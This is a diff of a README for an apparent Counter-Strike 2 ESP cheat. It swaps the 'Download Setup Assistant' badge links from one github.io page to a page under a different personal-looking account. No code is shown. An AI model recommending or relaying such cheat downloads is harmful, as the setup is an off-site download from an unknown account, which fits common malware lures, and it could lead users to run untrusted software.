@@ -1,7 +1,7 @@
 # Counter-Strike 2 ESP — Visual Debug Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://esp-counter-strike-2.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://esp-counter-strike-2.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://olgavarvaruk654.github.io/.github/esp-counter-strike-2)
+[![Download Now](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://olgavarvaruk654.github.io/.github/esp-counter-strike-2)
 
 ---
 
